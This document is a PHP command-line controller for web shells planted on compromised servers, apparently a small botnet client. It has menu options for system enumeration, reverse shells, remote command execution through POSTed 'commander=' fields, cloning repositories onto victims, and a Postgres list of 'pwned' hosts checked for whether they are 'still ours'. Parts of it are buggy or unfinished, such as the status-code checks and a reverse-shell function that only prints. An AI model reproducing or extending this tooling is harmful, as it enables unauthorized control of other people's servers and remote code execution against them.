<?php
require "includes/db/postgres_checker.php";
$cof = array(
    "useragent"=> "sp1.1",
    "host"=>"127.0.0.1",
    "port"=>"5432",
    "username"=>"postgres",
    "password"=>"",
    "dbname"=>"sloppy_bots"
    );
is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
define("CHH", curl_init());
define("UAGENT", curl_setopt(CHH, CURLOPT_USERAGENT, config['useragent']));

function menu($clear)
{
    if (!empty($clear)) {
        system($clear);
    }
    echo("\033[33;40m                                                                                    \033[0m\n");
    echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
    echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
    echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
    echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
    echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
    echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
    echo("\033[33;40m                                                                                    \033[0m\n");
    echo("\033[33;40m");
    echo <<< _MENU
        (O)ptions                                                                   
        (S)ystem enumeration                                                        
        (R)everse shell                                                             
        (C)ommand Execution                                                         
        (CL)oner                                                                    
        (U)pdates  -> not implemented yet.                                                                 
        (A)dd new host                                                              
        (CH)eck if hosts are still pwned                                            
        (M)ain menu                                                                 
        (Q)uit                                                                      
_MENU;
    echo "\n\n\033[0m\n";

}

function sys($host, $uri)
{
    if (!empty($host) && !empty($userA)) {
        curl_setopt(CHH, CURLOPT_URL,                "$host/$uri?qs=cqS");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        print("[ !! ] Host was empty... [ !! ]");
    }
    return 0;
}

function rev($host, $shell, $port, $os)
{
    $usePort = null;
    $Ushell = null;
    if (isset($host) and isset($port)) {
        if ($port === "default" && $shell === "default" && $os === "win") {
            $usePort = "1634";
            $Ushell = "powershell";
        } elseif($os === "lin") {
            $usePort = "1634";
            $Ushell = "bash";
        }else{
            $Ushell = $shell;
            $usePort = $port;
        }
        if (!is_null($Ushell)){
            echo "[ !! ] Setting custom options: \n";
            echo "Shell: ".$Ushell."\n";
            echo "OS: ". $os."\n";
        }
        echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
    }

}

function co($command, $host, $uri)
{
    if (!empty($host) && !empty($command) && !empty($uri)) {
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS,        "commander=$command");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    return $syst;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }

        }
    } else {
        print("[ !! ] Host was empty... [ !! ]");
    }
    return 0;
}

function clo($host, $repo, $uri)
{
    if (!empty($host) && !empty($repo) && !empty($uri)){
        curl_setopt(CHH, CURLOPT_URL,                       "$host/$uri");
        curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
        curl_setopt(CHH, CURLOPT_POST,                              true);
        curl_setopt(CHH,CURLOPT_POSTFIELDS,                "clone=$repo");
        $re = curl_exec(CHH);
        if (!curl_errno(CHH)){
            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)){
                case 200:
                    return $re;
                default:
                    throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
            }
        }else{
            return 0;
        }
    }else{
        return 0;
    }

}

function aHo($host)
{
    if (!empty($host)){
        if (postgres_checker::insertHost($host) != 0){
            echo "Successfully added: $host";
        }else{
            echo "There was an error. Double checking the database.";
            if (!postgres_checker::checkDB()){
                echo "There is a sevre error in the db, you need to ensure you have it crated.";
                echo "Attempting to re-create or create the DB.";
                if (postgres_checker::createDB()){
                    echo "Created the db successfully! Please re run this command to insert the new host.";
                }
            }else{
                echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
                postgres_checker::getRecord($host);
            }
        }
    }
}

function check($host, $path, $batch)
{
    if (!empty($batch)){
        switch ($batch){
            case "y":
                $c = pg_exec(DBCONN, "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL OR NOT '-'");
                $count = pg_exec(DBCONN, 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
                echo "Pulling: ". pg_fetch_row($count)."\nThis could take awhile.";
                curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                foreach (pg_fetch_all($c) as $r){
                    if (!empty($r)){
                        curl_setopt(CHH, CURLOPT_URL,                "$r[0]/$r[1]?qs=cqS");
                        $syst = curl_exec(CHH);
                        if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                            switch ($syst){
                                case 200:
                                    echo "Host is still ours!\n";
                                    break;
                                case 404:
                                    echo "Looks like our shell was caught... sorry..\n";
                                    break;
                                case 500:
                                    echo "Your useragent was not the correct one... did you forget??\n";
                                    break;
                                default:
                                    echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                    break;
                            }
                        }

                    }
                }
            case "n":
                if (!empty($host) && !empty($path)){
                    curl_setopt(CHH, CURLOPT_URL,                "$host/$path?qs=cqS");
                    curl_setopt(CHH, CURLOPT_TIMEOUT,                              5);
                    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT,                       5);
                    curl_setopt(CHH, CURLOPT_RETURNTRANSFER,                    true);
                    $syst = curl_exec(CHH);
                    if (!curl_errno(curl_getinfo(CHH, CURLINFO_HTTP_CODE))){
                        switch ($syst){
                            case 200:
                                echo "Host is still ours!\n";
                                break;
                            case 404:
                                echo "Looks like our shell was caught... sorry..\n";
                                break;
                            case 500:
                                echo "Your useragent was not the correct one... did you forget??\n";
                                break;
                            default:
                                echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
                                break;
                        }
                    }
                }
        }

    }

}

function queryDB($host, $fetchWhat){
    # place holder for the query db function. this will check what information we have about a host, and which options to set.
    # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
    # work in progress.
    # @todo
    if (!empty($host) || 0){
        try {
            $dbC = pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password']);
            switch(strtolower($fetchWhat)){
                case "r":
                    $row = pg_fetch_row($dbC, sprintf("SELECT os_flavor FROM sloppy_bots_main WHERE rhost = '%s'"), pg_escape_string($host));
                    break;
                default:
                    $row = pg_fetch_row($dbC, sprintf("SELECT uri FROM sloppy_bots_main WHERE rhost = '%s'"), pg_escape_string($host));
                    break;

            }
            if (!empty($row)){
                return $row[0];
            }else{
                return 0;
            }
        }catch (Exception $e){
            return $e;
        }


    }else {
        throw new Exception("Host was 0, are you sure you added it into the DB?\n");
    }
}


menu($clear = "clear");
$run = true;
while ($run) {
    print("\033[33;40mPlease select your choice: \n->");
    echo("\033[0m");
    $pw = trim(fgets(STDIN));
    switch (strtolower($pw)) {
        case "s":
            echo readline_list_history();
            $h = readline("Which host are we checking?\n(right now I only accept IP Addresses.)\n->");
            try {
                sys($h, queryDB($h, "s"));
            }catch (Exception $e){
                echo $e."\n";
            }
            break;
        case "r":
            $h = readline("Please tell me the host.\n->");
            $p = readline("\nWhich port shall we use?\n->");
            try {
                $o = !empty(queryDB($h, 'r')) | 0 ? "win" : "lin";
            } catch (Exception $e) {
                echo $e."\n";
            }
            echo $o;
            if (!empty($h) && !empty($p)){
                rev($host=$h,"default", $port=$p, $o);
            }
            break;
        case "c":
            try{
                $h = readline("Which host are we sending the command to?\n(right now I only accept IP Addresses.)\n->");
                $c = readline("And now the command: \n->");
                co($c, $h, queryDB($h, 'c'));
            }catch (Exception $e){
                echo $e."\n";
            }
            break;
        case "cl":
            try{
                $h = readline("Which host are we interacting with?\n->");
                $rep = readline("Repo to clone?\n->");
                clo($h, $rep, queryDB($h, "cl"));
            }catch (Exception $e){
                echo $e."\n";
            }
            break;
        case "u":
            echo "Will be in future editions.\n";
            break;
        case "a":
            try{
                $h = readline("Who did we pwn my friend?\n->");
                aHo($h);
            }catch (Exception $e){
                echo $e."\n";
            }
            break;
        case "ch":
            try{
                $h = readline("Who is it we need to check on?\n->");
                $b = readline("Is this going to be a batch job?(Y/N)\n->");
                switch (!empty(strtolower($b))){
                    case "n":
                        echo "Not executing batch job.\n";
                        check($h, queryDB($h, "ch"), "n");
                        break;
                    case "y":
                        echo "Executing batch job!\n";
                        check($h, queryDB($h, "ch"), "y");
                        break;
                    default:
                        echo "Your host was empty, sorry but I will return you to the previous menu.\n";
                        break;
                }
            }catch (Exception $e){
                echo $e."\n";
            }
            break;
        case "m":
            menu($clear = "clear");
            break;
        case "q":
            echo "\033[33;40mGood bye!\033[0m\n";
            $run = false;
            break;
        default:
            menu($clear = "clear");
            echo "\033[33;40myou need to select a valid option...\033[0m\n";
    }
}

